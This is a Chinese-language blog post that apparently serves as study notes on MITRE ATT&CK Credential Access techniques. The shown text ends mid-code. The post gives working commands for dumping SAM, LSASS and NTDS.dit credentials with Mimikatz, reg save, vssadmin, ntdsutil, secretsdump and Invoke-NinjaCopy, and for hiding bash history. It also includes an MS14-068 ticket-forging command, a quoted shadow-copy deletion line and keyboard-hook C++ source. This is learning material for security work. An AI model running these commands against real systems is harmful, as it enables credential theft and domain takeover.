<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="SeikoSrp">






<title>ATT&amp;CK_Credential Access | a blog</title>



    <link rel="icon" href="/haidao.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    
    <script src="/js/jquery.min.js"></script>
    



    
    
        
    




    <script>
    function searchToggle() {
        const width = $(document.body).width()
        if(width > 479) {
            return;
        }
        const search = $('.search');
        const searchForm = $('.form-search');
        const menuToggle = $('.menu-toggle');
        const title = $('.navbar-header-title');

        if(!search.hasClass("mobile-search")) {
            search.addClass("mobile-search");
            menuToggle.addClass("open-search")
            title.addClass("mobile-title-hidden")
        } else {
            search.removeClass("mobile-search");
            menuToggle.removeClass("open-search")
            // title.css({visibility: 'visible'})
            title.removeClass("mobile-title-hidden")
        } 
    }

    function search(searchInputEl, formEl, flag) {
        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
        $(formEl).submit(function(e){
            e.preventDefault();
            let target = null
            if(searchInputEl == null) {
                const screenWidth = $(document.body).width();
                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
                console.log(target);
            } else {
                target = $(searchInputEl)
            }

            if(!flag && target.val() === '') {
                return ;
            }

            $("#u-search").fadeIn(500, function() {
                $("body > .wrapper").addClass("modal-active");

                $.ajax({
                    url: path,
                    dataType: "json",
                    beforeSend: function (xhr) {
                        $input = target.val();
                        $(".form-input").val($input);
                        const loadingBar = $('.search-loading-bar') 
                        loadingBar.css({
                            width:'100%',
                            display: 'block'
                        });
                    },
                    success: function( datas ) {
                        // console.log(datas);
                        const $resultPanel = $(".modal-body")[0];
                        let str = `<ul class="modal-results">`;
                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
                        $resultPanel.innerHTML = "";
                        let hasResult = false
                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;

                        if ($(".form-input").val().trim().length <= 0) {
                            // 没有结果
                            $resultPanel.innerHTML = text;
                            return;
                        }
                        datas.forEach(function (data) {
                            var isMatch = true;
                            if (!data.title || data.title.trim() === '') {
                                data.title = "Untitled";
                            }
                            var data_title = data.title.trim().toLowerCase();
                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                            var data_url = data.url;
                            var index_title = -1;
                            var index_content = -1;
                            var first_occur = -1;
                            // only match artiles with not empty contents
                            if (data_content !== '') {
                                keywords.forEach(function (keyword, i) {
                                    index_title = data_title.indexOf(keyword);
                                    index_content = data_content.indexOf(keyword);

                                    if (index_title < 0 && index_content < 0) {
                                        isMatch = false;
                                    } else {
                                        hasResult = true
                                        if (index_content < 0) {
                                            index_content = 0;
                                        }
                                        if (i == 0) {
                                            first_occur = index_content;
                                        }
                                    }
                                });
                            } else {
                                isMatch = false;
                            }
                            // show search results
                            if (isMatch) {
                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
                                var content = data.content.trim().replace(/<[^>]+>/g, "");
                                if (first_occur >= 0) {
                                    // cut out 200 characters
                                    var start = first_occur - 40;
                                    var end = first_occur + 160;

                                    if (start < 0) {
                                        start = 0;
                                    }

                                    if (start == 0) {
                                        end = 200;
                                    }

                                    if (end > content.length) {
                                        end = content.length;
                                    }

                                    var match_content = content.substring(start, end);

                                    // highlight all keywords
                                    keywords.forEach(function (keyword) {
                                        var regS = new RegExp(keyword, "gi");
                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
                                    });

                                    str += `<span class="content"> ${match_content} ...</span></a>`;
                                }
                                str += "</li>";
                            }
                        });
                        str += "</ul>";
                        if(hasResult) {
                            $resultPanel.innerHTML = str;
                        } else {
                            $resultPanel.innerHTML = text;
                        }

                    },
                    complete: function() {
                        setTimeout(() => {
                                const loadingBar = $('.search-loading-bar') 
                                loadingBar.css({
                                    width:'0%',
                                    display: 'none'
                                });
                        }, 300)
                    }
                });
            })

        });
    }

    $(document).ready(function() {
        $('.modal-close').click(function () { 
            $("#u-search").fadeOut();
            $("body > .wrapper").removeClass("modal-active")
        })

        $('.modal-overlay').click(function() {
            $("#u-search").fadeOut();
            $("body > .wrapper").removeClass("modal-active")
        })
        search(null, ".form-search", false)
        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
    })
</script>

<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<!-- Chic/layout.ejs -->
 <div id="u-search">
        <div class="modal">
            <div class="modal-header">
                <div class="container">
                    <form id="u-search-modal-form" class="u-search-modal-form">
                        <button type="submit" class="form-submit-btn">
                            <img src="/image/search.png" class="search-btn-img" />
                        </button>
                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
                    </form>
                    <a class="modal-close">x</a>
                </div>
                <div class="search-loading">
                    <div class="search-loading-bar"></div>
                </div>
            </div>
            <div class="modal-body">
                <!-- ul 格式如下 -->
                <!-- <ul class="modal-results">
                    <li class="result-item">
                        <a class="result-item-detail">
                            <span class="title">页面配置</span>
                            <span class="content">
                                content
                            </span>
                        </a>
                    </li>
                </ul> -->
            </div>
        </div>
        <div class="modal-overlay"></div>
    </div>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
            <div class="menu navbar-right">
                <!-- 这里表示的是pc端搜索框 -->
                
                
    <div class="search ">
        <div class="search-btn" onClick="searchToggle()">
            <img src="/image/search.png" class="search-btn-img" />
        </div>
        <form class="form-search">
            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
        </form>
    </div>

                
                    <a class="menu-item" href="/archives">文章</a>
                
                    <a class="menu-item" href="/category">分类</a>
                
                    <a class="menu-item" href="/about">关于</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="navbar-mobile-right">
                    
                    
    <div class="search ">
        <div class="search-btn" onClick="searchToggle()">
            <img src="/image/search.png" class="search-btn-img" />
        </div>
        <form class="form-search">
            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
        </form>
    </div>

                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
                </div>
                
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">文章</a>
                
                    <a class="menu-item" href="/category">分类</a>
                
                    <a class="menu-item" href="/about">关于</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
        <a onclick="go_top()">回到顶部</a>
        <a onclick="go_bottom()">前往底部</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "全部折叠"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "全部展开"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">ATT&amp;CK_Credential Access</h1>
            
                <div class="post-meta">
                    
                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
                    

                    
                        <span class="post-time">
                        发布于: <a href="#">十二月 18, 2020&nbsp;&nbsp;18:47:41</a>
                        </span>
                    
                    
                        <span class="post-category">
                    分类:
                            
                                <a href="/categories/ATT-CK/">ATT&CK</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="Account-Manipulation-T1098"><a href="#Account-Manipulation-T1098" class="headerlink" title="Account Manipulation-T1098"></a>Account Manipulation-T1098</h2><p>账户操纵主要提到了修改权限，修改凭据，添加或更改权限组等能够进行的账户操作，更多情况下认为应该放在权限维持下面，并且这一项可以作为一个</p>
<h2 id="Bash-History-T1139"><a href="#Bash-History-T1139" class="headerlink" title="Bash History-T1139"></a>Bash History-T1139</h2><p>Bash使用“history”实用程序跟踪用户在命令行上键入的命令，有可能能够看到历史记录保存的此前登录系统的密码（亲身遇到过）</p>
<p>查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line"><span class="built_in">history</span></span><br></pre></td></tr></table></figure>

<p><strong>隐藏命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> +o <span class="built_in">history</span> 不会将任何当前会话写入日志。可以在会话期间任何时间运行，并隐藏所有命令。</span><br><span class="line"><span class="built_in">set</span> -o <span class="built_in">history</span> 重启日志记录，但是会记录 <span class="built_in">set</span> 命令，所以会发生一些明显的变化。</span><br><span class="line"><span class="built_in">history</span> -c 彻底清除历史（存在一个问题，就是bash_history文件其实还存在，ssh退出再上去依然能看到，所以还是把bash_history文件删除）</span><br></pre></td></tr></table></figure>

<h2 id="Brute-Force-T1110"><a href="#Brute-Force-T1110" class="headerlink" title="Brute Force-T1110"></a>Brute Force-T1110</h2><p>主要说了一些暴力破解的方式，而工具多种多样，一般情况下的爆破可以基于短时间内访问失败次数进行检测。比较有名的就是Hydra了。</p>
<p><img src="Credential_Access.assets/1574317122700.png" alt="1574317122700"></p>
<h2 id="Credential-Dumping-T1003"><a href="#Credential-Dumping-T1003" class="headerlink" title="Credential Dumping-T1003"></a>Credential Dumping-T1003</h2><h3 id="SAM-Security-Accounts-Manager"><a href="#SAM-Security-Accounts-Manager" class="headerlink" title="SAM(Security Accounts Manager)"></a>SAM(Security Accounts Manager)</h3><p>SAM包含主机的本地账户的HAS值（每一台主机中都存在一个SAM），利用工具：</p>
<p>​    <strong>pwdumpx.exe</strong></p>
<p>​        下载了pwdump7，直接执行exe文件即可</p>
<p><img src="Credential_Access.assets/1574317247983.png" alt="1574317247983"></p>
<p>​    <strong>gsecdump</strong></p>
<p>​        gsecdump -a 查看SAM</p>
<p>​    <strong>Mimikatz</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug(切换至管理员权限)</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574317265058.png" alt="1574317265058"></p>
<p>​    <strong>secretsdump.py</strong></p>
<p>​    <strong>Invoke-PowerDump.ps1</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-module Invoke-PowerDump.ps1</span><br><span class="line">Invoke-PowerDump</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574317328740.png" alt="1574317328740"></p>
<p><strong>Reg从注册表中提取SAM</strong></p>
<p>​    命令行执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\sam c:\sam</span><br><span class="line">reg save HKLM\system c:\system</span><br></pre></td></tr></table></figure>

<p>​    这种方式提取的文件是乱码，明文需要通过samdump2或者mimikatz再提</p>
<p><img src="Credential_Access.assets/1574317367660.png" alt="1574317367660"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam &#x2F;sam:sam &#x2F;system:system</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574317383054.png" alt="1574317383054"></p>
<h3 id="Local-Security-Authority-LSA"><a href="#Local-Security-Authority-LSA" class="headerlink" title="Local Security Authority (LSA)"></a>Local Security Authority (LSA)</h3><p>本地安全机构（LSA）是受Microsoft Windows保护的子系统，它是Windows客户端身份验证体系结构的一部分，该体系结构对本地计算机进行身份验证并创建登录会话。</p>
<p>LSA是一个认证机制,在负责Lsa的windows进程lsass中实际存储了系统的账户密码明文和加密过的HASH值。</p>
<h3 id="NTDS"><a href="#NTDS" class="headerlink" title="NTDS"></a>NTDS</h3><p>NTDS不同于SAM，SAM保存本地，NTDS保存在域控，保存了域内所有的HASH</p>
<p><strong>卷影复制</strong></p>
<p>卷影副本也称为快照，是存储在 Data Protection Manager (DPM) 服务器上的副本的时间点副本。副本是文件服务器上单个卷的受保护共享、文件夹和文件的完整时间点副本。</p>
<p>（勒索软件通常会删除卷影副本：C:\Windows\Sysnative\vssadmin.exe”Delete Shadows /All /Quiet）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow &#x2F;for&#x3D;c:</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574317582705.png" alt="1574317582705"></p>
<p><strong>secretsdump.py</strong></p>
<p>secretsdump.py在这里的作用是从已经导出的ntds.dit文件中导出明文。Mimikatz也可以达到相同的效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -ntds &#x2F;demo&#x2F;ntds&#x2F;ntds.dit -system &#x2F;demo&#x2F;ntds&#x2F;SYSTEM LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574317609798.png" alt="1574317609798">    </p>
<p><strong>ntdsutil.exe</strong></p>
<p>可以直接通过ntdsutil命令导出ntds.dit文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:temp&quot; q q</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574317634601.png" alt="1574317634601"></p>
<p><strong>Invoke-NinjaCopy.ps1</strong></p>
<p>使用命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\invoke-ninjacopy.ps1</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive</span><br></pre></td></tr></table></figure>

<p>导出的文件同样需要通过类似于mimikatz这样的工具导出为明文。</p>
<p>还有像Ntdsdump之类的工具，不再一一介绍。</p>
<h3 id="Plaintext-Credentials"><a href="#Plaintext-Credentials" class="headerlink" title="Plaintext Credentials"></a>Plaintext Credentials</h3><p>比如使用mimikatz和procdump组合使用导出系统中的密码</p>
<p>也可以直接使用mimkatz命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574317707084.png" alt="1574317707084"></p>
<p>上图是在windows server 2008中的截图，在windows server 2012中lsass中已经不存储明文。</p>
<p><img src="Credential_Access.assets/1574318018748.png" alt="1574318018748"></p>
<h2 id="Credentials-in-Files-T1081"><a href="#Credentials-in-Files-T1081" class="headerlink" title="Credentials in Files-T1081"></a>Credentials in Files-T1081</h2><p>提到了关于文件中保存的凭据或者密码文件</p>
<p>包括电子邮件客户端、谷歌浏览器、等，涉及到的一些工具暂未找到</p>
<p>其中提到了Get-GPPPassword.ps1</p>
<p>同时也可以使用命令快速搜索系统文件中的密码</p>
<p>例，通过findstr搜索带有password字段的文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">findstr &#x2F;si password *.txt</span><br><span class="line">findstr &#x2F;si password *.xml</span><br><span class="line">findstr &#x2F;si password *.ini</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574318204038.png" alt="1574318204038"></p>
<h2 id="Credentials-in-Registry-T1214"><a href="#Credentials-in-Registry-T1214" class="headerlink" title="Credentials in Registry-T1214"></a>Credentials in Registry-T1214</h2><p>可以通过命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure>

<p>分别查看本地机器和当前用户的含有password的项</p>
<h2 id="Exploitation-for-Credential-Access-T1212"><a href="#Exploitation-for-Credential-Access-T1212" class="headerlink" title="Exploitation for Credential Access-T1212"></a>Exploitation for Credential Access-T1212</h2><p>攻击者利用操作系统漏洞，或者是身份验证机制的错误来进行攻击。偏思路型，原文中举了几个例子，其中一个是MS14-068，直接使用利用工具可以申请具有域管理员权限的票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u normal@test.com -s S-1-5-21-1406004368-3818689962-3591297438-1105 -d 192.168.3.100 -p Server1</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574318277629.png" alt="1574318277629"></p>
<h2 id="Forced-Authentication-T1187"><a href="#Forced-Authentication-T1187" class="headerlink" title="Forced Authentication-T1187"></a>Forced Authentication-T1187</h2><p>当Windows系统尝试连接到SMB资源时，它将自动尝试进行身份验证，并将当前用户的凭据信息发送到远程系统。</p>
<p>当SMB被阻止或者失败时，WebDAV会做为备用协议。WebDAV是HTTP的扩展，通常通过TCP端口80和443运行。</p>
<p>攻击者可以利用这种方式诱导受害者访问其他资源。</p>
<p>例：</p>
<p>通过页面（钓鱼邮件等）中嵌入的代码发起SMB请求，然后进行SMB中继操作，或者用于检索文件</p>
<p><img src="Credential_Access.assets/1574318337349.png" alt="1574318337349"></p>
<h2 id="Hooking-T1179"><a href="#Hooking-T1179" class="headerlink" title="Hooking-T1179"></a>Hooking-T1179</h2><p>类似于进程注入，攻击者可以使用钩子在另一个进程的上下文中加载和执行恶意代码，从而屏蔽执行过程，同时还允许访问进程的内存和可能的特权。通过正常使用调用功能时，使用HOOK机制能够通过连续调用来提供持久性，或者是抓取键盘输入，从而获取被攻击着的一些账号密码。</p>
<p>这里直接使用逆向工程核心原理中的HOOK教程的代码来进行演示HOOK技术，拿键盘输入举例，首先了解一下在键盘输入时常规的Windows消息流：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、 发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]。</span><br><span class="line">2、 OS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中。</span><br><span class="line">3、 应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应事件的处理程序来进行处理。</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574318455954.png" alt="1574318455954"></p>
<p>从上图可以更形象的来理解这个过程。</p>
<p>下面直接利用原书中的示例代码来进行实验，我们通过编写的钩子（HOOK）文件来拦截notepad.exe的输入，首先使用C++生成一个HookMain.exe文件，源代码为HookMain.cpp:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"conio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	DEF_DLL_NAME <span class="meta-string">"KeyHook.dll"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	DEF_HOOKSTART <span class="meta-string">"HookStart"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	DEF_HOOKSTOP <span class="meta-string">"HookStop"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">	PFN_HOOKSTART HookStart = <span class="literal">NULL</span>;</span><br><span class="line">	PFN_HOOKSTOP HookStop = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span> ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>( hDll == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"LoadLibrary(%s) failed!!! [%d]"</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">	HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line">	HookStart();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"press 'q' to quit!\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>( _getch() != <span class="string">'q'</span> )	;</span><br><span class="line">	HookStop();</span><br><span class="line">	FreeLibrary(hDll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再生成一个DLL文件，名为KeyHook.dll，源代码为KeyHook.cpp:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_PROCESS_NAME <span class="meta-string">"notepad.exe"</span></span></span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>( dwReason )</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">			g_hInstance = hinstDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">	<span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span>( nCode &gt;= <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>( !(lParam &amp; <span class="number">0x80000000</span>) )</span><br><span class="line">		&#123;</span><br><span class="line">			GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">			p = <span class="built_in">strrchr</span>(szPath, <span class="string">'\\'</span>);</span><br><span class="line">			<span class="keyword">if</span>( !_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME) )</span><br><span class="line">				<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>( g_hHook )</span><br><span class="line">		&#123;</span><br><span class="line">			UnhookWindowsHookEx(g_hHook);</span><br><span class="line">			g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span 